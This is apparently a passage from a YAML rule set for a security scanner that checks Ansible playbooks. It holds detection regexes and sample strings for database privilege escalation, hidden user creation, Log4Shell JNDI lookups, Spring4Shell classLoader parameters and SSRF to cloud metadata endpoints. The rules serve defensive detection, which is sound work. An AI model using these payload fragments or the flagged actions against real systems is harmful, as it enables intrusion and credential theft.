    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "database_privilege_escalation"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Database Privilege Escalation"
    description: "Granting excessive database privileges that could enable backdoor access"
    regex: "GRANT\\s+(?:ALL\\s+PRIVILEGES|SUPERUSER|CREATE|ALTER|DROP).*TO\\s+[a-zA-Z_][a-zA-Z0-9_]*"
    positive_examples:
      - "- name: Grant CREATEDB privilege to database user for force_drop_db"
    recommendation: "GRANT ALL PRIVILEGES / SUPERUSER / CREATE / ALTER / DROP grants standing administrative access; replace with the minimum role the workload requires (e.g. SELECT/INSERT on named tables) via community.postgresql.postgresql_privs / community.mysql.mysql_user and review the grant in code review."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "hardcoded_database_password"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Hardcoded Database Password"
    description: >-
        psql/mysql/sqlcmd/sqlite3/mongo command-line carries WITH PASSWORD,
        IDENTIFIED BY, --password=, or -p with a 6+ char literal. The shape leaks
        the DB credential to argv and shell history.
    regex: "(?:psql|mysql|sqlcmd|sqlite3|mongo).*(?:(?:WITH PASSWORD|IDENTIFIED BY)[\\s=]|--password=|-p)['\"][^'\"]{6,}['\"]"
    positive_examples:
      - "psql -U postgres -c \\\"ALTER USER \\\\\\\"{{ awx_postgres_user }}\\\\\\\" WITH PASSWORD '{{ awx_postgres_pass }}';\\\""
    recommendation: "Database CLIs with --password=... / -p'...' on argv leak credentials via /proc and shell history; switch to env (PGPASSWORD), .my.cnf [client] (mode 0600), or community.{mysql,postgresql,mongodb} modules with login_password: loaded from Ansible Vault."
    nist_controls: ['IA-5(7)', 'SC-28', 'AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "suspicious_database_maintenance"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Suspicious Database Maintenance"
    description: "Database operations hidden in maintenance scripts with output suppression"
    regex: "(?:psql|mysql|sqlcmd|sqlite3|mongo).*(?:CREATE\\s+USER|GRANT|ALTER\\s+USER|DROP\\s+USER).*(?:>/dev/null|2>&1|\\|\\|\\s*true)"
    positive_examples:
      - "psqlCREATE USER>/dev/null"
    recommendation: "CREATE USER / GRANT / ALTER USER / DROP USER paired with >/dev/null 2>&1 / || true masks failures of credential-altering DDL; treat the task as malicious, remove it, and audit the database's authentication log for unauthorised changes."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "hidden_command_execution"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Hidden Command Execution"
    description: "Commands with output suppression that could hide malicious activity"
    regex: "(?:curl|wget|psql|mysql|ssh|bash|sh).*(?:CREATE|GRANT|chmod|chown|useradd|usermod).*(?:>/dev/null\\s*2>&1|2>/dev/null|\\|\\|\\s*true)"
    positive_examples:
      - "curlCREATE>/dev/null2>&1"
    recommendation: "Combining CREATE / GRANT / chmod / chown / useradd / usermod with output suppression (>/dev/null 2>&1, || true) hides whether the change actually applied; let stdout/stderr surface to Ansible (the runner already captures them) and rely on changed_when: / failed_when: for control flow."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  # -- 2024-2026 named-CVE exploitation patterns -----------------------------

  - id: "log4shell_exploitation_payload"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Log4Shell (CVE-2021-44228) Exploitation Payload in Playbook"
    description: "A task embeds a JNDI lookup string - `${jndi:ldap://...}`, `${jndi:rmi://...}`, `${jndi:dns://...}`, or an obfuscated `${${lower:j}ndi:...}` / `${::-j}${::-n}${::-d}${::-i}:` form - into a header, URL parameter, template, or shell command. This is the Log4Shell exploitation vector against any unpatched Log4j 2.x <= 2.14.1 (CVE-2021-44228) or <= 2.15.0 (CVE-2021-45046). A playbook that ships this payload is either actively exploiting vulnerable targets or preserving a pen-test payload that must not land in production."
    regex: "\\$\\{(?:jndi|(?:[^}{]*\\$\\{[^}]*\\})*[^}]*(?:jndi|JNDI|\\$\\{[:a-zA-Z_-]*[jJ][:a-zA-Z_-]*\\}))[^}]{0,300}(?:ldap|rmi|dns|corba|iiop|nis|nds|ldaps)"
    positive_examples:
      - "${jndildap"
    multiline: false
    recommendation: "Remove the payload. Targets must be patched to Log4j >= 2.17.1 (or >= 2.12.4 for Java 7, >= 2.3.2 for Java 6). Short-term mitigation on legacy targets: set `-Dlog4j2.formatMsgNoLookups=true` and remove the `JndiLookup` class (`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`). Detection: EDR/WAF/SIEM rule on the regex above across inbound HTTP headers and URL parameters."
    no_ansible_remediation: true
    nist_controls: ['RA-5', 'SI-2', 'SI-3', 'SI-4']
    pci_dss: ['6.3.3', '11.3.1']
    soc2: ['CC7.1', 'CC7.3']
    mitre_attack: ['T1059', 'T1190']
    cwe: ['CWE-20', 'CWE-74', 'CWE-502']
    cve: ["CVE-2021-44228", "CVE-2021-45046"]
    owasp_appsec: ["A03:2021", "A08:2021"]
    owasp_asvs: []
    references:
      - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"

  - id: "spring4shell_exploitation_payload"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Spring4Shell (CVE-2022-22965) Exploitation Payload in Playbook"
    description: "A task embeds the Spring4Shell exploitation primitive - `class.module.classLoader.resources.context.parent.pipeline.first.pattern=...`, `class.module.classLoader.resources.context.parent.pipeline.first.suffix=...`, or the AccessLogValve-based JSP webshell write (`pattern=%{c2}i`, `suffix=.jsp`, `directory=webapps/ROOT`). This is active exploitation of Spring Framework < 5.2.20 / < 5.3.18 on Tomcat with JDK >= 9 (CVE-2022-22965)."
    regex: "class\\.module\\.classLoader\\.resources\\.context\\.parent\\.pipeline\\.first\\.(?:pattern|suffix|prefix|directory|fileDateFormat)\\s*="
    positive_examples:
      - "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    multiline: false
    recommendation: "Remove the payload. Patch Spring Framework to >= 5.3.18 or >= 5.2.20; on JDK <= 8 the vulnerability is not exploitable. If you cannot patch immediately, set a `WebDataBinder.setDisallowedFields` global configuration blocking `class.*`, `Class.*`, `*.class.*`, `*.Class.*`. Detection: WAF rule on the regex above; hunt for unexpected `.jsp` writes under `webapps/ROOT/`."
    no_ansible_remediation: true
    nist_controls: ['RA-5', 'SI-2', 'SI-3', 'SI-4']
    pci_dss: ['6.3.3', '11.3.1']
    soc2: ['CC7.1', 'CC7.3']
    mitre_attack: ['T1190', 'T1505.003']
    cwe: ['CWE-20', 'CWE-94']
    cve: ["CVE-2022-22965"]
    owasp_appsec: ["A03:2021"]
    references:
      - "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"

  - id: "ssrf_to_cloud_metadata_service"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "SSRF to Cloud Instance Metadata Service From Ansible URI Module"
    description: "An `ansible.builtin.uri`, `ansible.builtin.get_url`, `community.general.uri`, or raw `curl`/`wget` task targets a cloud instance-metadata endpoint: `169.254.169.254` (AWS / GCP / Azure / Oracle IMDS), `fd00:ec2::254` (AWS IPv6 IMDS), `metadata.google.internal`, or `metadata.azure.com`. A playbook that pulls IMDS data and exfiltrates or templates it elsewhere is the canonical SSRF-to-credential-theft primitive (Capital One, Drupalgeddon successor campaigns) - and inside cloud CI runners where the playbook is attacker-influenced, IMDSv1 responses include the instance-profile's temporary credentials."
    regex: "(?:ansible\\.builtin\\.(?:uri|get_url)|community\\.general\\.uri|curl\\b|wget\\b)[\\s\\S]{0,400}?(?:(?:url|src|uri)\\s*:\\s*[\"']?(?:https?://)?(?:169\\.254\\.169\\.254|\\[?fd00:ec2::254\\]?|metadata\\.google\\.internal|metadata\\.azure\\.com|metadata\\.packet\\.net|100\\.100\\.100\\.200)|\\b(?:169\\.254\\.169\\.254|metadata\\.google\\.internal|metadata\\.azure\\.com)\\b)"
    positive_examples:
      - "ansible.builtin.uriurl:169.254.169.254"
    multiline: true
    window: 6
    recommendation: "IMDS access from a playbook is legitimate only when the playbook runs **on the instance itself** for bootstrapping/tagging, and only via IMDSv2 (AWS: `PUT` to `/latest/api/token` then `X-aws-ec2-metadata-token` header). Never template IMDS response bodies into other `uri` tasks, logs, or files readable by CI - any of those become credential exfiltration. Enforce IMDSv2 at the instance level (`HttpTokens: required`, `HttpPutResponseHopLimit: 1`). In CI, block 169.254.169.254 with a per-job network policy or egress firewall."
    no_ansible_remediation: true
    nist_controls: ['AC-3', 'SC-7', 'SI-4', 'SI-10']
    pci_dss: ['1.2.1', '6.2.4', '8.6.2']
    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)']
    soc2: ['CC6.1', 'CC6.6', 'CC7.1']
    mitre_attack: ['T1078.004', 'T1528', 'T1552.005']
    cwe: ['CWE-522', 'CWE-918']
    owasp_appsec: ["A04:2021", "A10:2021"]
    owasp_asvs: [V13.2.1, V11.2.5]

